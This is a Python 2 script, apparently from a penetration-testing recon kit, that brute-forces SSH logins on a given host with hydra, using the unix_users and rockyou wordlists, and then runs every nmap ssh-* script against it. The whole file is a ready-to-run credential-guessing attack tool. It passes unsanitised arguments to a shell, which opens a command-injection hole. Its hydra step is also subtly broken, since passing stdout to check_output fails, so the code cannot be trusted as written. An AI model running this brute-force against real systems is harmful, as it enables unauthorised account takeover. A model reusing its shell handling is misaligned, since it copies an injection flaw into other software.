#!/usr/bin/env python
import subprocess
import sys
import recon
import os

if len(sys.argv) != 3:
    print "Usage: sshrecon.py <ip address> <port>"
    sys.exit(0)

ip_address = sys.argv[1].strip()
port = sys.argv[2].strip()

try:
    print "\033[1;37m[-]  ----------------------------------------------------------------------------- \033[1;m"
    print('\033[1;37m[-]  |     Starting hydra SSH scan against {0}:{1}\033[1;m'.format(ip_address, port))
    print "\033[1;37m[-]  ----------------------------------------------------------------------------- \033[1;m"
    HYDRA = "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f -o ./results/{0}/{0}_sshhydra.txt -u {0} -s {1} ssh".format(ip_address, port)
    try:
        with open(os.devnull, "w") as f:
            results = subprocess.check_output(HYDRA, shell=True, stdout=f)
            resultarr = results.split("\n")
            for result in resultarr:
                if "login:" in result:
                    print('\033[1;32m[*]  Valid SSH credentials found\033[1;m')
    except:
        print('\033[1;33m[-]  No valid SSH credentials found\033[1;m')

    print "\033[1;37m[-]  ----------------------------------------------------------------------------- \033[1;m"
    print('\033[1;37m[-]  |     Starting SSH script scan for {0}:{1}\033[1;m'.format(ip_address, port))
    print "\033[1;37m[-]  ----------------------------------------------------------------------------- \033[1;m"
    SSHSCAN = "nmap -sV -Pn -vv -p {0} --script=ssh-* -oN './results/{1}/{1}_ssh.nmap' {1}".format(port, ip_address)
    results = subprocess.check_output(SSHSCAN, shell=True)
    recon.logparsertxt(results)
    outfile = "results/{0}/{0}_sshrecon.txt".format(ip_address)
    f = open(outfile, "w")
    f.write(results)
    f.close()
except:
    print('\033[1;31m[-]  SSH script scan for {0}:{1} had some errors.\033[1;m'.format(ip_address, port))